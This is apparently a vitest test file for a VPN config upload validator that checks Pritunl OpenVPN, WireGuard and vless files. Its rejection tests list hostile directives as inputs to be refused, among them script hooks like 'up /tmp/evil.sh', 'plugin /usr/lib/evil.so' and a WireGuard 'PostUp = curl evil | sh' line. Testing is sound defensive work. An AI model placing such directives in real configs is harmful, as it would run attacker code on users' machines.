import { describe, expect, it } from "vitest";
import { getConfigType } from "@/server/vpn/types";

const v = (type: string, content: string) => getConfigType(type)!.validate(content);
const LINK = "vless://11111111-2222-4333-8444-555555555555@nl-1.example.test:443?security=reality&sni=x#nl";

describe("content validators", () => {
  it("pritunl .ovpn needs `client` and `remote`", () => {
    expect(v("pritunl", "client\ndev tun\nremote vpn.example.test 1194\n").ok).toBe(true);
    expect(v("pritunl", "client\r\nremote a 1\r\n")).toMatchObject({ ok: true, content: "client\nremote a 1\n" });
    expect(v("pritunl", "dev tun\nremote a 1\n")).toMatchObject({ ok: false, reason: "ovpn_missing_client" });
    expect(v("pritunl", "client\ndev tun\n")).toMatchObject({ ok: false, reason: "ovpn_missing_remote" });
    expect(v("pritunl", "# client\nremote a 1")).toMatchObject({ ok: false, reason: "ovpn_missing_client" });
  });

  it("wireguard .conf needs [Interface] with PrivateKey and [Peer]", () => {
    expect(v("wg", "[Interface]\nPrivateKey = abc=\n\n[Peer]\nPublicKey = def=\n").ok).toBe(true);
    expect(v("wg", "[Peer]\nPublicKey = x\n")).toMatchObject({ ok: false, reason: "wg_missing_interface" });
    expect(v("wg", "[Interface]\nPrivateKey = a\n")).toMatchObject({ ok: false, reason: "wg_missing_peer" });
    expect(v("wg", "[Interface]\nAddress = 10.0.0.2/32\n[Peer]\n")).toMatchObject({ ok: false, reason: "wg_missing_private_key" });
  });

  it("vless .txt holds exactly one valid vless:// link", () => {
    expect(v("vless", `${LINK}\n`)).toMatchObject({ ok: true, content: `${LINK}\n` });
    expect(v("vless", `\n  ${LINK}  \n\n`)).toMatchObject({ ok: true, content: `${LINK}\n` });
    expect(v("vless", `${LINK}\n${LINK}\n`)).toMatchObject({ ok: false, reason: "vless_expected_one_link" });
    expect(v("vless", "vmess://abc")).toMatchObject({ ok: false, reason: "vless_not_a_link" });
    expect(v("vless", "vless://not-a-uuid@h:443")).toMatchObject({ ok: false, reason: "vless_bad_uuid" });
    expect(v("vless", "vless://11111111-2222-4333-8444-555555555555@host")).toMatchObject({ ok: false, reason: "vless_bad_port" });
    expect(v("vless", "vless://11111111-2222-4333-8444-555555555555@host:70000")).toMatchObject({ ok: false });
  });

  it.each([
    "script-security 2",
    "up /tmp/evil.sh",
    "  down /tmp/x",
    "--route-up /bin/sh",
    "plugin /usr/lib/evil.so",
    "tls-verify ./check",
    "config /etc/other.conf",
  ])("refuses an .ovpn with %s", (line) => {
    expect(v("pritunl", `client\nremote a 1\n${line}\n`)).toMatchObject({ ok: false, reason: "ovpn_forbidden_directive" });
  });

  it("allows those words in comments and inline blocks", () => {
    expect(v("pritunl", "client\nremote a 1\n# up /tmp/x\n; script-security 2\n<key>\nup\n</key>\n").ok).toBe(true);
    expect(v("pritunl", "client\nremote a 1\nsetenv UV_ID abc\npersist-tun\n").ok).toBe(true);
  });

  it("accepts standard Pritunl client options and inline key material", () => {
    // Sanitized shape of Pritunl's OVPN_INLINE_CLIENT_CONF (no real keys).
    expect(v("pritunl", `# {"user":"alice"}
ignore-unknown-option data-ciphers
setenv UV_ID test-id
setenv UV_NAME test-name
client
dev tun
dev-type tun
remote vpn.example.test 1194 udp
nobind
persist-tun
cipher AES-256-CBC
data-ciphers AES-256-GCM:AES-256-CBC
auth SHA256
verb 4
mute 4
push-peer-info
ping 10
ping-restart 60
hand-window 70
server-poll-timeout 4
reneg-sec 2592000
sndbuf 393216
rcvbuf 393216
remote-cert-tls server
<ca>
test-certificate
</ca>
<cert>
test-certificate
</cert>
<key>
test-key
</key>
`).ok).toBe(true);
  });

  it.each(["PostUp = curl evil | sh", "preup=iptables -F", "  PreDown = x", "PostDown=y"])("refuses a WireGuard .conf with %s", (line) => {
    expect(v("wg", `[Interface]\nPrivateKey = a\n${line}\n[Peer]\nPublicKey = b\n`)).toMatchObject({ ok: false, reason: "wg_forbidden_directive" });
  });

  it("rejects empty, binary and oversized files", () => {
    expect(v("wg", "  \n")).toMatchObject({ ok: false, reason: "empty" });
    expect(v("wg", "[Interface]\u0000")).toMatchObject({ ok: false, reason: "binary_content" });
    expect(v("pritunl", `client\nremote a 1\n${"#".repeat(300_000)}`)).toMatchObject({ ok: false, reason: "too_large" });
  });

  it.each([
    '"script-security" 2', "'up' /tmp/no-run", '"plugin" /tmp/no-load',
    "setenv opt up /tmp/no-run", "--up /tmp/no-run", "log /tmp/no-write",
    "ignore-unknown-option up", "ignore-unknown-option unknown-option",
    "<connection>\nremote a 1\n</connection>", "<unknown>\nup /tmp/no-run\n</unknown>",
    "<ca>\nunterminated", "auth-user-pass /etc/passwd", "providers /tmp/no-load", "unknown-option value",
  ])("rejects noncanonical, unsupported and executable OpenVPN options: %s", (line) => {
    expect(v("pritunl", `client\nremote a 1\n${line}\n`)).toMatchObject({ ok: false, reason: "ovpn_forbidden_directive" });
  });

  it("returns a validation error for malformed URI escapes", () => {
    expect(v("vless", "vless://%ZZ@vpn.example.test:443")).toMatchObject({ ok: false, reason: "vless_bad_uuid" });
  });
});
